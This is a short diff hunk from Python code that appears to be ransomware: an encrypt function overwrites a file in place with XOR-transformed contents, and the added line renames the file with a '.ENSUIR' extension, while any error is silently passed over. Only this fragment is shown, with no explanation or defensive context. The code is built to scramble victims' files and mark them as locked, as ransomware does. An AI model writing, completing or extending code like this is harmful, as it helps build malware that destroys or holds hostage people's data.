@@ -30,6 +30,7 @@ def encrypt(file):
         try:
             with open(file, 'wb') as fp:
                 fp.write(xord(data))
+            os.rename(file, file+".ENSUIR")
         except:
             pass
 
